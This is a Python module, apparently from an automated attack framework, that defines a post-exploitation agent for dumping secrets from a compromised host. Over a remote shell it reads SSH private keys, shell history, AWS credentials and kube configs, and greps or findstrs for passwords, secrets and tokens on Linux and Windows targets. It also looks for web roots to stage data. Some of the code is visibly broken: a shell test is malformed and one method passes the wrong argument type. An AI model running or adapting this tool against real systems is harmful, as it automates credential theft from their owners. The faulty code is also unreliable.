import logging
from core.data_models import AgentData, Strategy
from typing import Dict, Any, Optional
from core.logger import log
from core.data_models import DataDumpReport, Strategy, AttackPhase, ErrorType
import asyncio
from core.shell_manager import ShellManager
from core.target_model_manager import TargetModelManager
import time

from core.base_agent import BaseAgent


class DataDumperAgent(BaseAgent):
    # Assuming AttackPhase enum is not available
    supported_phases = ["POST_EXPLOITATION"]
    required_tools = []
    """
    An agent that attempts to dump sensitive data from a compromised host.
    """

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.shell_manager: Optional[ShellManager] = None
        self.target_model_manager: Optional[TargetModelManager] = None
        self.report_class = DataDumpReport # Set report class

    async def setup(self):
        """Asynchronous setup method for DataDumperAgent."""
        self.shell_manager = await self.context_manager.get_context('shell_manager')
        self.target_model_manager = await self.context_manager.get_context('target_model_manager')

    async def _find_and_update_web_root(self, shell_id: str):
        """Tries to find the web root directory and updates the TargetModel."""
        log.info("[DataDumperAgent] Attempting to find web root directory...")
        web_roots = ["/var/www/html", "/var/www/",
                     "/usr/share/nginx/html", "/var/www/html/wordpress"]
        for root in web_roots:
            check_cmd = f"if [ -d {root}; then echo '{root}'; fi"
            try:
                output = await self.shell_manager.send_command(shell_id, check_cmd)
                if output and root in output:
                    log.success(f"[DataDumperAgent] Found web root at: {root}")
                    # Assuming target_host is available in shared_data
                    target_host = await self.context_manager.get_context('target_host')
                    target_model = self.target_model_manager.get_or_create_target(
                        target_host)
                    target_model.web_root_path = root
                    self.target_model_manager.save_model(
                        target_model)
                    log.info(
                        f"[DataDumperAgent] Updated TargetModel for {target_host} with web_root_path: {root}")
                    return  # Stop after finding the first one
            except Exception as e:
                log.warning(
                    f"[DataDumperAgent] Error checking for web root {root}: {e}")
        log.warning(
            "[DataDumperAgent] Could not find a common web root directory.")

    async def run(self, strategy: Strategy, **kwargs) -> DataDumpReport:
        start_time = time.time()
        shell_id = strategy.context.get("shell_id")
        if not shell_id:
            end_time = time.time()
            return DataDumpReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id="",
                errors=["Missing shell_id in context."],
                error_type=ErrorType.CONFIGURATION,
                summary="Data dump failed: Missing shell ID."
            )

        log.info(
            f"[DataDumperAgent] Attempting to dump data and find web root on shell {shell_id}.")

        # --- Task 1: Find Web Root (for Staging) ---
        await self._find_and_update_web_root(shell_id)

        # --- Task 2: Dump Sensitive Data ---
        post_ex_report = await self.context_manager.get_context('post_ex_report')
        os_info = post_ex_report.os_info if post_ex_report else "linux"
        is_windows = "windows" in os_info.lower()

        commands_to_run = {}
        if is_windows:
            log.info(
                "[DataDumperAgent] Windows OS detected. Targeting Windows-specific files.")
            commands_to_run = {
                "unattended_xml": r"dir /s /b C:\unattended.xml",
                "web_config": r"dir /s /b C:\web.config",
                "sensitive_files": r"dir /s /b C:\*.bak C:\*.conf C:\*.config C:\*.ini C:\*.log C:\*.sql C:\*.yml C:\*.yaml",
                "passwords": r'findstr /s /i "password" C:\*',
                "secrets": r'findstr /s /i "secret" C:\*',
                "tokens": r'findstr /s /i "token" C:\*'}
        else:
            log.info(
                "[DataDumperAgent] Linux/Unix OS detected. Targeting Linux-specific files.")
            commands_to_run = {
                "ssh_keys": "cat ~/.ssh/id_rsa 2>/dev/null",
                "bash_history": "cat ~/.bash_history 2>/dev/null",
                "aws_creds": "cat ~/.aws/credentials 2>/dev/null",
                "kube_config": "cat ~/.kube/config 2>/dev/null",
                "sensitive_files": "find / -name \"*.bak\" -o -name \"*.conf\" -o -name \"*.config\" -o -name \"*.ini\" -o -name \"*.log\" -o -name \"*.sql\" -o -name \"*.yml\" -o -name \"*.yaml\" 2>/dev/null",
                "passwords": "grep -r \"password\" /etc 2>/dev/null",
                "secrets": "grep -r \"secret\" /etc 2>/dev/null",
                "tokens": "grep -r \"token\" /etc 2>/dev/null"}

        async def run_and_collect(data_type, command):
            try:
                log.info(f"Executing command for '{data_type}': {command}")
                output = await self.shell_manager.send_command(shell_id, command)
                if output and "no such file" not in output.lower() and "cannot access" not in output.lower():
                    log.success(f"Successfully dumped '{data_type}'.")
                    return data_type, output
            except Exception as e:
                error_msg = f"Command for '{data_type}' failed: {e}"
                log.warning(f"[DataDumperAgent] {error_msg}")
            return data_type, None

        tasks = [run_and_collect(data_type, command)
                 for data_type, command in commands_to_run.items()]
        results = await asyncio.gather(*tasks)

        dumped_data = {data_type: output for data_type,
                       output in results if output}
        errors = [
            f"Failed to dump {data_type}" for data_type, output in results if not output]

        if not dumped_data:
            log.warning(
                "[DataDumperAgent] No targeted sensitive data was found.")
            end_time = time.time()
            return DataDumpReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=errors + ["No targeted data found."],
                error_type=ErrorType.LOGIC,
                summary="Data dump completed: No sensitive data found."
            )

        end_time = time.time()
        return DataDumpReport(
            agent_name=self.__class__.__name__,
            start_time=start_time,
            end_time=end_time,
            shell_id=shell_id,
            dumped_data=dumped_data,
            summary=f"Successfully dumped {len(dumped_data)} data types.",
            errors=errors
        )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute data dumper agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
